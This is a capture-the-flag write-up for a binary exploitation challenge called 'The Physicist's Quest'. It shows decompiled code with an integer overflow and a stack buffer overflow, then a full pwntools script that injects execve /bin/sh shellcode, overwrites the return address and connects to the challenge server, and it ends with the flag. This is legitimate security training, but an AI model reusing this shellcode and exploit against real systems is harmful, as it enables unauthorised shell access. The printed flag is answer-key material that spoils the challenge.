+++
title = "The Physicist's Quest"
date = 2024-07-04
authors = ["Abhinav I S"]
+++

First, we run checksec on the binary

```bash
checksec --file=challenge
```

<br>
{{ img(id="image1.png", alt="Alt Text", class="textCenter") }}

NX disabled indicates we can execute from stack, hence this is likely a shellcode injection challenge.

Now, opening in a decompiler (Ghidra):

```c

undefined8 main(void)

{
  int local_70;
  int local_6c;
  undefined local_68 [92];
  uint local_c;
  
  fflush(stdout);
  puts("Hi you know my buddy");
  puts("He\'s stuck with his research on string theory");
  puts(
      "He\'s too proud to admit it, but he needs your help. But first you will need to prove that yo u are worthy enough for this"
      );
  puts("enter two magic numbers");
  __isoc99_scanf(&DAT_001020e1,&local_6c);
  __isoc99_scanf(&DAT_001020e1,&local_70);
  if ((-1 < local_6c) && (-1 < local_70)) {
    local_c = local_70 + local_6c;
    printf("Your magic value is %d\n",(ulong)local_c);
    if ((int)local_c < 0) {
      puts(
          "Good job! Now you need to figure out my location so that I can trick my friend into meeti ng you"
          );
      printf("Meet us in secrecy at %p\n",local_68);
      read(0,local_68,200);
    }
    return 0;
  }
  printf("BAZINGA! Close but not close");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

ok , if local_6c and local_70 are positive and their sum is negative, we can write into a buffer, and the address of this buffer is printed out.

The first if conditions can be achieved by [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow).

Now, we put shellcode in the buffer and overwrite the return address with the address of the buffer (the shellcode).

We can create our solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")

context.binary = exe
# context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rvcechalls.xyz", 29639)

    return r


def main():

    shellcode =  b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

    r = conn()
    r.recv()
    r.sendline(b"2147483645")
    r.sendline(b"10")
    data = r.recv()
    print(data.split(b" ")[-1])
    win = int(data.split(b" ")[-1], 16)
    print(hex(win))
    payload = shellcode + b"A"*(0x68-48) + p64(win)
    # good luck pwning :)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()

```

note that we need an additional  0x68-48 bytes to reach the return address since the shellcode is 48 bytes long.
Shellcode was obtained from a [Shellcode Database](https://shell-storm.org/shellcode/index.html)

Running the script spawns a shell, and we can print out the flag

<br>
{{ img(id="image2.png", alt="Alt Text", class="textCenter") }}
<br>

```
flag{Gre4t_Y0u_h3lp4d_h1m_TBBT}
```